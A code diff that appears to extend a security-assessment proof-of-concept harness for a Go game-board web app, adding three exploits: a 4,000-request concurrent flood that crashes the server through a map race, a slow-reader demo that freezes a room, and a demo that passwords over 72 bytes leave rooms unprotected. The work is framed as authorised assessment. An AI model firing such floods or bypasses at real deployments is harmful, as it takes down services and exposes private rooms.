@@ -34,10 +34,13 @@ import (
 
 	"github.com/golab/board/internal/fetch"
 	izip "github.com/golab/board/internal/zip"
+	"github.com/golab/board/pkg/core"
 	"github.com/golab/board/pkg/core/board"
 	"github.com/golab/board/pkg/core/color"
 	"github.com/golab/board/pkg/core/coord"
 	"github.com/golab/board/pkg/core/parser"
+	evpkg "github.com/golab/board/pkg/event"
+	"github.com/golab/board/pkg/room"
 	"github.com/golab/board/pkg/state"
 	"golang.org/x/net/websocket"
 )
@@ -685,6 +688,95 @@ func pocM7() {
 }
 
 // =========================================================================
+// EXTENDED REVIEW — concurrency / crypto (see SECURITY_ASSESSMENT.md §11)
+// =========================================================================
+
+// DR-1: concurrent map iteration+write on r.nicks -> fatal runtime throw.
+// handleUpdateNickname returns event.NewEvent("connected_users", r.Nicks()) where
+// Nicks() returns the LIVE map; the /api/v1 handler json.Marshal()s it OUTSIDE the
+// lock while a concurrent request's SetNick writes r.nicks. A concurrent-map access
+// is a FATAL runtime error, NOT a panic, so net/http's recover cannot contain it.
+func pocDR1() {
+	banner("dr1", "Concurrent map read/write on r.nicks via /api/v1 -> fatal whole-server crash")
+	requireTarget()
+	before := serverAlive()
+	fmt.Println("firing concurrent POST /api/v1/room/dr1 update_nickname (distinct userids)...")
+	var wg sync.WaitGroup
+	sem := make(chan struct{}, 64)
+	for i := 0; i < 4000; i++ {
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(n int) {
+			defer wg.Done()
+			defer func() { <-sem }()
+			body := fmt.Sprintf(`{"event":"update_nickname","value":"n%d","userid":"u%d"}`, n, n)
+			req, _ := http.NewRequest("POST", "http://"+target+"/api/v1/room/dr1", strings.NewReader(body))
+			resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(req)
+			if err == nil {
+				_ = resp.Body.Close()
+			}
+		}(i)
+	}
+	wg.Wait()
+	fmt.Println("flood done — expect: fatal error: concurrent map iteration and map write")
+	reportCrash(before)
+}
+
+// DL-2: Broadcast holds r.mu across the blocking SendEvent (ws write, no deadline),
+// so one stuck-reading client freezes the ENTIRE room. Local demo with a writer
+// whose SendEvent blocks after the initial frame.
+type blockingWriter struct {
+	evpkg.EventChannel
+	calls int32
+	block chan struct{}
+}
+
+func (b *blockingWriter) SendEvent(evpkg.Event) error {
+	if atomic.AddInt32(&b.calls, 1) == 1 {
+		return nil // let RegisterConnection's initial frame through
+	}
+	<-b.block
+	return nil
+}
+
+func pocDL2() {
+	banner("dl2", "Slow-reader freezes the whole room (r.mu held during blocking ws write)")
+	r := room.NewRoom("freeze")
+	stuck := &blockingWriter{EventChannel: evpkg.NewMockEventChannel(), block: make(chan struct{})}
+	defer close(stuck.block)
+	r.RegisterConnection(stuck)
+
+	go r.Broadcast(evpkg.NewEvent("global", "x")) // takes r.mu, then blocks on the 2nd SendEvent
+	time.Sleep(150 * time.Millisecond)
+
+	done := make(chan struct{})
+	go func() { _ = r.Size(); close(done) }() // r.Size() needs r.mu
+	select {
+	case <-done:
+		fmt.Println("r.Size() completed — room NOT frozen (unexpected)")
+	case <-time.After(1 * time.Second):
+		fmt.Println(">> CONFIRMED: r.Size() blocked ~1s — one stuck reader holds r.mu via Broadcast and")
+		fmt.Println(">> freezes the entire room (all joins/moves/frames). No write deadline anywhere.")
+		fmt.Println(">> Escalates: Hub.SendMessages holds h.mu while broadcasting to every room.")
+	}
+}
+
+// CS-2: a password > 72 bytes makes bcrypt error; core.Hash discards the error and
+// returns "", so the room is stored with an EMPTY password -> silently open.
+func pocCS2() {
+	banner("cs2", "Password > 72 bytes silently disables room protection (discarded bcrypt error)")
+	for _, n := range []int{72, 73, 100} {
+		pw := strings.Repeat("A", n)
+		h := core.Hash(pw)
+		open := h == "" // authorized middleware treats empty password as no password
+		fmt.Printf("password len=%3d -> stored hash %s -> room OPEN to everyone: %v\n",
+			n, map[bool]string{true: "\"\" (EMPTY!)", false: "<bcrypt>"}[open], open)
+	}
+	fmt.Println(">> a 73+ byte password stores an empty hash -> HasPassword()=false -> anyone can enter,")
+	fmt.Println(">> while the owner believes the room is protected. bcrypt rejects >72 bytes; Hash ignores it.")
+}
+
+// =========================================================================
 // SECOND PASS (new findings) — see SECURITY_ASSESSMENT.md §10
 // =========================================================================
 
@@ -820,6 +912,9 @@ var pocs = []struct {
 	{"m4", "[medium] SSRF: fetch follows redirects, no timeout (CONFIRMED)", pocM4},
 	{"m5", "[medium] Twitch challenge echoed before verify (CONFIRMED)", pocM5},
 	{"m7", "[medium] coord/board OOB panic — recovered in request path (CONFIRMED)", pocM7},
+	{"dr1", "[ext] Concurrent map race on r.nicks via /api/v1 — fatal crash (CONFIRMED)", pocDR1},
+	{"dl2", "[ext] Slow-reader freezes whole room (lock held during ws write) (CONFIRMED)", pocDL2},
+	{"cs2", "[ext] >72-byte password silently disables protection (CONFIRMED)", pocCS2},
 }
 
 func usage() {
@@ -829,8 +924,8 @@ func usage() {
 	for _, p := range pocs {
 		fmt.Printf("  %-4s %s\n", p.id, p.title)
 	}
-	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7  (h6 verifies a mitigation)")
-	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5")
+	fmt.Println("\nlocal-only (no -target needed): c2 c5 c6 h6 h7 a1 b1 m4 m7 dl2 cs2  (h6 verifies a mitigation)")
+	fmt.Println("need -target (live disposable instance): c1 c3 c4 c7 h1 h2 h3 h4 h5 m2 m3 m5 dr1")
 	fmt.Println("b1 also runs e2e when -target is given (uploads the poison, then you join to brick it)")
 	fmt.Println("\nWARNING: several PoCs crash or exhaust the target. Authorised local testing only.")
 }
